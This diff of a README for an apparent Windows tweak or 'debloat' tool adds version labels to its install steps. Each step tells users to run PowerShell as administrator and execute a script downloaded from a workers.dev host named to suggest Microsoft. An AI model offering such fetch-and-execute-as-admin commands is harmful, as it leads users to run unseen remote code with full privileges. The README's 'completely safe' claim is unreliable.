@@ -53,11 +53,11 @@ It's Completely Safe to use because everything is reversible
 25. Completely uninstall Google playstore
 
 # How to use
-### Easy Start Command
+### Easy Start Command (Windows 10 and 11)
 Start powershell with admin right and paste the following link and enter. <br />
 ```iex((New-Object System.Net.WebClient).DownloadString('https://ps.microsoft-toolbox.workers.dev'))``` <br />
 
-### Quick Start Command
+### Quick Start Command (Windows 10 Only)
 Paste the Following command in the startmenu search bar and enter <br />
 ```powershell -c "Start-Process powershell \"iex((New-Object System.Net.WebClient).DownloadString('https://ps.microsoft-toolbox.workers.dev'))\" -Verb Runas"```
  
